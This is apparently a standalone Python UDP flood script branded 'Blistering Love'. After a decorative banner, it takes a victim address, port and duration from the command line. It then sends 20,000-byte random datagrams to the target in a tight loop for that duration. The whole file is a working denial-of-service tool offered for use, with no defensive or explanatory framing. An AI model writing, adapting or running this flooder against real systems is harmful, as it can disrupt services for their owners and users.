import time
import socket
import sys
import os
import time 
def start():
    print("""
                                                                                                                    
________  ___                                                                 ____                                  
`MMMMMMMb.`MM 68b                                68b                          `MM'                                  
 MM    `Mb MM Y89           /                    Y89                           MM                                   
 MM     MM MM ___   ____   /M      ____  ___  __ ___ ___  __     __            MM        _____  ____    ___  ____   
 MM    .M9 MM `MM  6MMMMb\/MMMMM  6MMMMb `MM 6MM `MM `MM 6MMb   6MMbMMM        MM       6MMMMMb `MM(    )M' 6MMMMb  
 MMMMMMM(  MM  MM MM'    ` MM    6M'  `Mb MM69 "  MM  MMM9 `Mb 6M'`Mb          MM      6M'   `Mb `Mb    d' 6M'  `Mb 
 MM    `Mb MM  MM YM.      MM    MM    MM MM'     MM  MM'   MM MM  MM          MM      MM     MM  YM.  ,P  MM    MM 
 MM     MM MM  MM  YMMMMb  MM    MMMMMMMM MM      MM  MM    MM YM.,M9          MM      MM     MM   MM  M   MMMMMMMM 
 MM     MM MM  MM      `Mb MM    MM       MM      MM  MM    MM  YMM9           MM      MM     MM   `Mbd'   MM       
 MM    .M9 MM  MM L    ,MM YM.  ,YM    d9 MM      MM  MM    MM (M              MM    / YM.   ,M9    YMP    YM    d9 
_MMMMMMM9'_MM__MM_MYMMMM9   YMMM9 YMMMM9 _MM_    _MM__MM_  _MM_ YMMMMb.       _MMMMMMM  YMMMMM9      M      YMMMM9  
                                                               6M    Yb                                             
                                                               YM.   d9                                             
                                                                YMMMM9 
    Created by NeverCore             
    """)
    time.sleep(3)
    love(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
def love(victim, vport, duration):
    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = os.urandom(20000)
    timeout =  time.time() + duration
    blazes = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        target.sendto(byte, (victim, vport))
        blazes = blazes + 1
        print("Sending Blistering Love to" + " " + sys.argv[1])
def main():
    print(len(sys.argv)) 
    if len(sys.argv) != 4:
        print("1")
    else:
        start()
        

if __name__ == '__main__':
    main()

